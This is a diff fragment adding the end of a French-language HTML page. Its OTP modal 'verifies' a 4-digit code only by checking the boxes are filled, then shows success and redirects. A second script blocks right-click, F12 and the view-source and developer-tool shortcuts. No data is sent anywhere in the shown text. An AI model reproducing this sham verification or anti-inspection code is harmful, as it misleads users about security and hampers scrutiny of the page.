+            // --- Modal OTP : vérification du code ---
+            const verifyBtn = document.getElementById('verifyBtn');
+            if (verifyBtn) {
+                verifyBtn.addEventListener('click', async () => {
+                    const codeComplet = Array.from(otpBoxes).every(input => input.value.length > 0);
+                    if (codeComplet) {
+                        // Désactiver le bouton pour éviter les doubles clics
+                        verifyBtn.disabled = true;
+                        verifyBtn.style.opacity = '0.6';
+                        verifyBtn.style.cursor = 'default';
+
+
+
+                        // Afficher le message de succès
+                        const successMessage = document.getElementById('redirectCountdown');
+                        successMessage.style.display = 'block';
+
+                        // Rediriger après 10 secondes
+                        setTimeout(() => {
+                            window.location.href = 'settings.accueil.html';
+                        }, 10000);
+                    } else {
+                        alert('Veuillez saisir le code complet à 4 chiffres.');
+                    }
+                });
+            }
+        });
+    </script>
+
+    <script>
+        /* Protection basique contre l'inspection */
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+        document.querySelectorAll('img').forEach(img => {
+            img.setAttribute('oncontextmenu', 'return false');
+            img.setAttribute('ondragstart', 'return false');
+        });
+    </script>
+
+</body>
+</html>
